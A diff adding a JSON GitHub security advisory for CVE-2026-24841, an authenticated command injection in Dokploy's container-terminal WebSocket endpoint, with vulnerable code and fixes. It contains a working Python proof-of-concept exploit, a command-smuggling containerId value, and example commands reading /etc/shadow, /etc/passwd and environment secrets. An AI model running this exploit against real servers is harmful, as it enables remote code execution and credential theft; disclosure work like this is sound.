@@ -1,0 +1,50 @@
+{
+  "global": null,
+  "id": "GHSA-vx6x-6559-x35r",
+  "repo": {
+    "cve_id": "CVE-2026-24841",
+    "cvss_severities": {
+      "cvss_v3": {
+        "score": 9.9,
+        "vector_string": "CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:C/C:H/I:H/A:L"
+      },
+      "cvss_v4": {
+        "score": null,
+        "vector_string": null
+      }
+    },
+    "cwe_ids": [
+      "CWE-78"
+    ],
+    "description": "## Summary\r\n\r\nA critical command injection vulnerability exists in Dokploy's WebSocket endpoint `/docker-container-terminal`. The `containerId` and `activeWay` parameters are directly interpolated into shell commands without sanitization, allowing authenticated attackers to execute arbitrary commands on the host server.\r\n\r\n## Vulnerability Details\r\n\r\n**Affected File:** `apps/dokploy/server/wss/docker-container-terminal.ts`\r\n\r\nThe vulnerability occurs because user-supplied parameters are directly concatenated into shell commands:\r\n\r\n```typescript\r\n// Lines 32-33: User input extracted without validation\r\nconst containerId = url.searchParams.get(\"containerId\");\r\nconst activeWay = url.searchParams.get(\"activeWay\");\r\n\r\n// Line 57 (SSH remote execution): Direct interpolation\r\nconn.exec(`docker exec -it -w / ${containerId} ${activeWay}`, { pty: true }, ...);\r\n\r\n// Lines 123-127 (Local execution): Direct interpolation into shell\r\nconst ptyProcess = spawn(shell, [\"-c\", `docker exec -it -w / ${containerId} ${activeWay}`], {});\r\n```\r\n\r\n### Attack Vector\r\n\r\nAn attacker can inject shell metacharacters via the `containerId` parameter:\r\n\r\n```\r\ncontainerId = \"x;MALICIOUS_COMMAND;#\"\r\n```\r\n\r\nThis results in:\r\n```bash\r\ndocker exec -it -w / x;MALICIOUS_COMMAND;# sh\r\n```\r\n\r\nThe shell interprets `;` as a command separator, executing `MALICIOUS_COMMAND` independently.\r\n\r\n## Proof of Concept\r\n\r\n### PoC Script\r\n\r\n```python\r\n#!/usr/bin/env python3\r\n\"\"\"\r\nDokploy Command Injection PoC (CVE-2026-XXXXX)\r\nAuthenticated RCE via WebSocket - CRITICAL\r\n\r\nUsage:\r\n  python3 dokploy-poc.py <target> <cookie>           # Run default tests\r\n  python3 dokploy-poc.py <target> <cookie> <cmd>    # Run custom command\r\n\r\nExamples:\r\n  python3 dokploy-poc.py http://localhost:3000 \"cookie=xxx\" whoami\r\n  python3 dokploy-poc.py http://localhost:3000 \"cookie=xxx\" \"ls -la /root\"\r\n  python3 dokploy-poc.py http://localhost:3000 \"cookie=xxx\" \"cat /etc/shadow\"\r\n\"\"\"\r\nimport sys, asyncio\r\nfrom urllib.parse import quote\r\ntry:\r\n    import websockets\r\nexcept ImportError:\r\n    sys.exit(\"pip install websockets\")\r\n\r\nasync def exploit(target, cookie, cmd):\r\n    payload = f\"x;{cmd};#\"\r\n    uri = f\"{target.replace('http','ws')}/docker-container-terminal?containerId={quote(payload)}&activeWay=sh\"\r\n    out = \"\"\r\n    try:\r\n        async with websockets.connect(uri, additional_headers={\"Cookie\": cookie}) as ws:\r\n            while True:\r\n                try:\r\n                    out += await asyncio.wait_for(ws.recv(), timeout=2)\r\n                except asyncio.TimeoutError:\r\n                    break\r\n    except Exception as e:\r\n        return f\"Error: {e}\"\r\n    # Clean docker error noise\r\n    lines = out.split('\\n')\r\n    clean = [l for l in lines if not any(x in l for x in ['docker:', 'Usage:', 'docker exec', \"See '\"])]\r\n    return '\\n'.join(clean).strip()\r\n\r\nasync def main():\r\n    if len(sys.argv) < 3:\r\n        print(__doc__)\r\n        sys.exit(1)\r\n\r\n    target, cookie = sys.argv[1], sys.argv[2]\r\n\r\n    if len(sys.argv) > 3:\r\n        cmd = \" \".join(sys.argv[3:])\r\n        print(f\"$ {cmd}\\n\")\r\n        print(await exploit(target, cookie, cmd))\r\n    else:\r\n        print(f\"[*] Target: {target}\\n\")\r\n        for name, cmd in [(\"id\", \"id\"), (\"passwd\", \"head -3 /etc/passwd\"), (\"env\", \"env|head -5\")]:\r\n            out = await exploit(target, cookie, cmd)\r\n            vuln = \"uid=\" in out or \"root:\" in out or \"=\" in out\r\n            print(f\"[{'!' if vuln else '?'}] {name}: {out[:150] if out else 'no response'}\\n\")\r\n\r\nif __name__ == \"__main__\":\r\n    asyncio.run(main())\r\n```\r\n\r\n### Exploitation Evidence\r\n\r\nTested on canary environment (`canary.dokploy.com`):\r\n\r\n<img width=\"2346\" height=\"1223\" alt=\"poc\" src=\"https://github.com/user-attachments/assets/2c623bcc-7294-4ab8-9042-bf8ed0e18e01\" />\r\n\r\n\r\n## Impact\r\n\r\n- **Remote Code Execution (RCE)** on the Dokploy host server\r\n- **Credential Theft** - Access to environment variables containing secrets, API keys, database passwords\r\n- **Full System Compromise** - Read/write access to all deployed applications and data\r\n- **Potential Container Escape** - Possibility of escalating to host system\r\n\r\n## Recommended Fix\r\n\r\n### Option 1: Input Validation\r\n\r\n```typescript\r\nfunction isValidContainerId(id: string): boolean {\r\n    return /^[a-f0-9]{12,64}$/i.test(id);\r\n}\r\n\r\nfunction isValidShell(shell: string): boolean {\r\n    return ['sh', 'bash', 'zsh', 'ash'].includes(shell);\r\n}\r\n\r\nif (!containerId || !isValidContainerId(containerId)) {\r\n    ws.close(4000, \"Invalid container ID\");\r\n    return;\r\n}\r\n```\r\n\r\n### Option 2: Avoid Shell Interpolation\r\n\r\n```typescript\r\n// Use array arguments instead of shell string\r\nconst ptyProcess = spawn('docker', ['exec', '-it', '-w', '/', containerId, activeWay], {});\r\n```\r\n\r\n## References\r\n\r\n- CWE-78: https://cwe.mitre.org/data/definitions/78.html\r\n- Vulnerable Code: https://github.com/Dokploy/dokploy/blob/canary/apps/dokploy/server/wss/docker-container-terminal.ts\r\n",
+    "ghsa_id": "GHSA-vx6x-6559-x35r",
+    "html_url": "https://github.com/Dokploy/dokploy/security/advisories/GHSA-vx6x-6559-x35r",
+    "identifiers": [
+      {
+        "type": "GHSA",
+        "value": "GHSA-vx6x-6559-x35r"
+      },
+      {
+        "type": "CVE",
+        "value": "CVE-2026-24841"
+      }
+    ],
+    "published_at": "2026-01-27T20:29:25Z",
+    "references": [],
+    "severity": "critical",
+    "summary": "Authenticated Remote Code Execution via Command Injection in Docker Container Terminal WebSocket Endpoint",
+    "updated_at": "2026-01-27T22:47:40Z",
+    "vulnerabilities": [
+      {
+        "package": {
+          "ecosystem": "",
+          "name": ""
+        },
+        "patched_versions": "v0.26.6",
+        "vulnerable_version_range": "v0.26.5 < "
+      }
+    ],
+    "withdrawn_at": null
+  },
+  "repository": "Dokploy/dokploy"
+}
